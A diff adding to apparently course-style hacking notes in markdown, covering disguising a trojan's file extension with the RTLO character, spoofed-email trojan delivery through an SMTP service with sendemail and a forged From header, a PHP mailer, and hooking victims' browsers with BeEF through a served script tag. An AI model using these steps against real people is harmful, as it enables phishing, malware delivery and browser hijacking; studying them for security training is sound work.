@@ -919,3 +919,62 @@ $ msfconsole
 you want to use.
   6. it will become : trojan[RTLO]fdp.exe --> trojanexe.pdf
 - archive the file so that browser will not replace RTLO character
+
+## Spoofing Emails Method 1- setting up SMTP server (Trojan delivery method)
+- objective:
+  - Use gathered info to contact target.
+  - Send an email pretending to be a friend.
+  - Ask them to open a link, download a program
+  - Support member -> ask to login to control panel using fake login page
+  - Support member -> ask to run a command on Server
+  - Ask to visit a normal web pages etc
+- information gathering is very important here
+- see online "**spoof emails online**", problem with these that the email from these sites end up in spam folder of user
+- Sign up to be SMTP web server, will give better results
+  - ex: www.sendinblue.com
+- Kali Program can be used to send email via SMTP server : **sendemail**
+```
+ > sendemail --help
+ > sendemail -xu USERNAME -xp PASSWORD -s SERVER:PORT -f SEND_EMAIL_FROM_THIS_USER_EMAIL_ID -t SEND_TO_THIS_EMAIL_ID -u SUBJECT -m TEXT_MESSAGE_WITH_LINK_TO_TROJAN
+ # Trojan can be uploaded to dropbox for downloading
+ Note: modify dropbox download file url and put dl=1 in place of dl=0 at the end of url
+ to download file directly
+ > use advance option --->  -o message-header="From: FIRST_NAME SECOND_NAME <NAME@email.com>"
+ to message to look like sent from actual user
+```
+## Spoofing Emails Method 2
+- web hosting platform . ex: 000webhost.com
+- setup account
+- upload file : mailer.php (added in repository)
+- view php file
+- fill form and submit
+
+## BeEF : Browser exploitation Framework
+- Browser exploitation Framework allowing us to launch a number of attacks on a hooked target
+- targets are hooked once they load a hook url
+    - DNS spoof requests to a page containing the hook code ```(<script>)```
+    - Inject the hook in browsed pages (need to be MITM)
+    - Use XSS exploit
+    - Social Engineer the target to open a hook page
+  - start with: **beef start**
+  - first time it will ask to set a password for default user
+  - use credentials:
+    - username: beef
+    - password : set by user
+  - online browser : hooked to beef right now (you can control)
+  - offline browser : browsers previously connected
+  - to browser to get hook, specific javascript code need to executed
+    - can be seen on beef console
+    - hook code is : ```<script src="http://127.0.0.1;3000/hook.js"></script>```
+  - work against all browser that runs Javascript
+  - example:
+  ```
+  paste hook code in /var/www/html/index.html
+  replace the localhost address with the address of Hacker machine
+  if somebody access Hacker ip address, it'll have a web server running on it which will execute index.html file
+  # start web server
+  > service apache2 start
+  access hackers ip address from victim's browser
+  ```
+  - Command tab that will be used to execute beef commands
+  - xxRays shows XSS vulnerability
